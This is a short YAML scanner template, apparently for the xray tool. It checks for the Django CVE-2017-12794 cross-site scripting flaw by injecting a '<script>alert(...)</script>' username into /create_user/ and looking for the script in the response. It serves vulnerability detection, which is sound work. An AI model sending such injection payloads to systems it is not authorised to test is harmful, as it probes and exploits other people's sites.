name: poc-yaml-django-cve-2017-12794-xss
transport: http
set:
    r1: randomInt(10000,999999)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /create_user/?username=<script>alert({{r1}})</script>
            follow_redirects: true
        expression: response.status >= 200
    r1:
        request:
            cache: true
            method: GET
            path: /create_user/?username=<script>alert({{r1}})</script>
            follow_redirects: false
        expression: response.body.bcontains(bytes("(<script>alert(" + string(r1) + ")</script>)"))
expression: r0()&&r1()
detail:
    author: ivan
    links:
        - https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794